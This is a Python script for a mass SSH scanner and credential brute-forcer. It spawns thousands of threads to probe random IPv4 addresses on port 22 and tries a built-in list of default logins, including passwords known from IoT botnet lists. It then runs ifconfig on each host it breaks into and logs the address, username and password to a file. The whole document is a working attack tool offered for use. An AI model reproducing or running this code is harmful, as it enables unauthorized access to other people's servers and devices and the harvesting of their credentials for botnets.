import sys
import threading
import random
import socket
from datetime import datetime

print(f'[!] [{str(datetime.now().time())}] SSH Scanner started...')

try:
    import paramiko
except ImportError:
    print(f'[!] [{str(datetime.now().time())}] You do not have paramiko installed')

paramiko.util.log_to_file('/dev/null')

global scriptName
global threads
global ranged
global timeOUT
global octets
global octet1
global octet2
global octet3

usernames = ['root', 'guest', 'support', 'admin1', 'Administrator', 'admin', 'ubnt', 'pi', 'root', 'test']

passwords = ['1234', 'root', '123456', '54321', 'test', 'support', 'password', 'pass', 'system', 'realtek', 'dreambox',
             '7ujMko0admin', '7ujMko0vizxv', 'anko', '1111', 'klv123', 'default', 'xmhdipc', 'ubnt', 'xc3511', 'vizxv',
             '888888', 'raspberry', 'guest', 'toor', '12345', 'admin', 'root1234', 'admin1234']

if len(sys.argv) < 5:
    print(
        f'    Usage: python {str(sys.argv[0])} <threads> <range> <octets> <timeout>'
    )
    print(f'Example 1: python {str(sys.argv[0])} 4000 a 94 10')
    print(f'Example 2: python {str(sys.argv[0])} 4000 b 94.102 10')
    sys.exit()

scriptName = str(sys.argv[0])
threads = str(sys.argv[1])
ranged = str(sys.argv[2])
octets = str(sys.argv[3])
timeOUT = str(sys.argv[4])

print(f'[!] [{str(datetime.now().time())}] Threads: {threads}')
print(f'[!] [{str(datetime.now().time())}]   Range: {ranged}')
print(f'[!] [{str(datetime.now().time())}]  Octets: {octets}')
print(f'[!] [{str(datetime.now().time())}] timeout: {timeOUT}')


def scanner(id):
    global scriptName
    global threads
    global ranged
    global octets
    global timeOUT
    global octet1
    global octet2
    global octet3
    if (
            ranged == 'a'
            and '.' in str(octets)
            or ranged not in ['a', 'b', 'c', 'random']
    ):
        sys.exit()
    elif ranged == 'a':
        octet1 = str(octets)
    elif ranged == 'b':
        try:
            octet1, octet2 = str(octets).split('.')
        except Exception:
            sys.exit()
    elif ranged == 'c':
        try:
            octet1, octet2, octet3 = str(octets).split('.')
        except Exception:
            sys.exit()
    # scan
    while 1:
        try:
            output = ''
            if ranged == 'a':
                target = f'{octet1}.{random.randrange(0, 256)}.{random.randrange(0, 256)}.{random.randrange(0, 256)}'
            elif ranged == 'b':
                target = f'{octet1}.{octet2}.{random.randrange(0, 256)}.{random.randrange(0, 256)}'
            elif ranged == 'c':
                target = f'{octet1}.{octet2}.{octet3}.{random.randrange(0, 256)}'
            elif ranged == 'random':
                target = f'{random.randrange(0, 256)}.{random.randrange(0, 256)}.{random.randrange(0, 256)}.{random.randrange(0, 256)}'
            port = 22
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(int(timeOUT))
            sock.connect((target, port))
            sock.close()
            breaker = False
            for username in usernames:
                for password in passwords:
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(target, port=port, username=username, password=password, timeout=10)
                        ssh.close()
                        breaker = True
                        break
                    except Exception:
                        ssh.close()
                if breaker == True:
                    break
            good = False
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(target, port=port, username=username, password=password, timeout=10)
                stdin, stdout, stderr = ssh.exec_command("/sbin/ifconfig")
                output = stdout.read()
            except Exception:
                ssh.close()
            if 'inet' in output:
                good = True
            if good:
                with open('vulnerableSSH.txt', 'a') as log:
                    log.write(f'{target}|{str(username)}|{str(password)}|{port}' + '\n')
                print(
                    f'[!] [{str(datetime.now().time())} | {str(id)}] Succeeded: {target}|{str(username)}|{str(password)}|{port}'
                )
                ssh.close()
        except Exception:
            try:
                sock.close()
            except Exception:
                closed = True


count = 0
for _ in range(int(threads)):
    try:
        count = count + 1
        t = threading.Thread(target=scanner, args=(count,))
        t.start()
    except Exception:
        print(
            f'[!] [{str(datetime.now().time())}] Could not start thread: {str(count)}'
        )
print(f'[!] [{str(datetime.now().time())}] Threads started: {str(count)}')